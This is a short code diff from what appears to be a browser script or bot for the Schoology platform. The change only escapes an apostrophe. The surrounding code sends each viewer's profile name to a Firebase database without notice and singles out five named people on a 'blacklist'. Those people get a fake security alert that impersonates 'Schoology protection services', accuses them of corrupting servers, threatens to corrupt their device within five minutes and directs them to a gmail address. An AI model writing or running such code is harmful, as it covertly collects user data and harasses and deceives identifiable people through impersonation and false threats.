@@ -14,7 +14,7 @@ firebase.database().ref().push({name:$("#profile").children()[0].innerHTML,times
 var blacklist = ["Ayush Selar","Ravi Bandaru","Aryan Tadwalkar", "Aditya Thiyag", "Trevor Shackleford"]
 if(blacklist.indexOf($("#profile").children()[0].innerHTML)!=-1){
 
-  eval('console.error("Hello "+$("#profile").children()[0].innerHTML +" our HT Sideparse search results have compiled and we have found that you are corrupting the Schoology servers. You will be dealt with shortly. Currently, we are deploying our countermeasures to corrupt the device under the name of " + $("#profile").children()[0].innerHTML + ". If you don't respond within 5 minutes, the Streamline Query will be executed. Please contact schoologyprotectionservices@gmail.com for further information. Error code: rjm7b-4n")')
+  eval('console.error("Hello "+$("#profile").children()[0].innerHTML +" our HT Sideparse search results have compiled and we have found that you are corrupting the Schoology servers. You will be dealt with shortly. Currently, we are deploying our countermeasures to corrupt the device under the name of " + $("#profile").children()[0].innerHTML + ". If you don\'t respond within 5 minutes, the Streamline Query will be executed. Please contact schoologyprotectionservices@gmail.com for further information. Error code: rjm7b-4n")')
        } else{
 //Hacktimer, makes it so the bot laggs you, even when you don't have the tab focused :O
 //Educates the stupid, and shows the seasoned an annoying message
